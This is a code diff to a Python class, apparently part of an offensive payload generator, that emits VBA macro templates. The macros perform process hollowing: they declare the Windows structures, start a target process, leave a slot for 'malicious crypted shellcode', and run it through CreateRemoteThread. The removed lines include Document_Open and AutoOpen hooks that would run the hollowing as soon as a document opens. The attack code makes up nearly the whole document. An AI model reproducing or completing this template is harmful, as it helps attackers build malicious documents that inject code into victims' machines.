@@ -20,11 +20,9 @@ class spawnandinject:
 
     def compilerOptions(self) -> list[str]:
         return []
-
-    def template(self) -> str:
-        return Template("""
-{imports}
-
+    
+    def codeblocks(self) -> str:
+        return """
 Private Type PROCESS_BASIC_INFORMATION
     Reserved1 As LongPtr
     PebAddress As LongPtr
@@ -61,19 +59,10 @@ Private Type PROCESS_INFORMATION
     dwProcessId As Long
     dwThreadId As Long
 End Type
+"""
 
-Sub Document_Open()
-    hollow
-End Sub
-
-Sub AutoOpen()
-    hollow
-End Sub
-
-{codeblocks}
-
-' Performs process hollowing to run shellcode in svchost.exe
-Function hollow()
+    def template(self) -> str:
+        return Template("""
     Dim si As STARTUPINFOA
     RtlZeroMemory si, Len(si)
     si.cb = Len(si)
@@ -85,7 +74,6 @@ Function hollow()
     
     ' Buffer for malicious crypted shellcode needs to go here
     Dim shellcode As Variant
-
     
     {transformers}
     Dim scSize As Long
@@ -107,6 +95,4 @@ Function hollow()
     thread = CreateRemoteThread(pi.hProcess, ByVal 0&, 0, addr, ByVal 0&, 0, ByVal 0&)
 
     b = WaitForSingleObject(thread, 500)
- 
-End Function
 """).substitute(target=self.target, memoryPermission=self.memoryPermission)
